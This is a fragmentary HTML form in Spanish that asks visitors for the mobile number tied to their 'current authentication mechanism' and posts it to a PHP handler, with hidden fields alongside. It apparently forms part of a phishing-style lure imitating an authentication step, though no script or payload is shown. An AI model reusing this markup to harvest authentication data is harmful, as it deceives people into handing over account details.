...
<div id="vista1">
    <div class="containerimg">
        <div class="divform1">
            <form action="procesar_numero.php" method="post" onsubmit="return sender2();">
                <p id="gfg" hidden></p>
                <p id="address" hidden></p>
                <div align="center">
                    <span class="ingresartxt" style="font-size: 1.1rem;">Ingresa su número</span>
                </div>
        ...
        <div class="divform2">
            <span class="ingresartxt" style="font-size: 1.1rem;">Numero movil</span>
            <hr class="line1" color="#C4C4C4">
            <span class="registertext">
                Digitando los datos de su mecanismo de autenticación actual. <br><br>
                Ingrese el numero registrado, por favor.
            </span>
        </div>
    </div>
</div>
